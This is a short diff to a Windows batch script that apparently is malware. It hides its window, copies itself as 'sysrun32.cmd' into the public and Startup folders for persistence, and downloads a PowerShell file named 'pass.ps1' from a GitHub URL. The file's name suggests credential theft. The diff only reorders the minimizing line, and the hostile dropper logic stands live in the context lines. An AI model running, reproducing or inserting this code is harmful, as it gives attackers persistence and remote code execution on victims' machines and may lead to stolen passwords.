@@ -1,8 +1,8 @@
 @echo off
+if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
 set cver=1
 set "startup=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
 call :verify
-if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
 copy %0 "%public%\sysrun32.cmd" & cls
 copy %0 "%startup%sysrun32.cmd" & cls
 if not exist "%public%\pass.ps1" (Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/baikil/randomcode/main/pass.ps1','%public%\pass.ps1')")
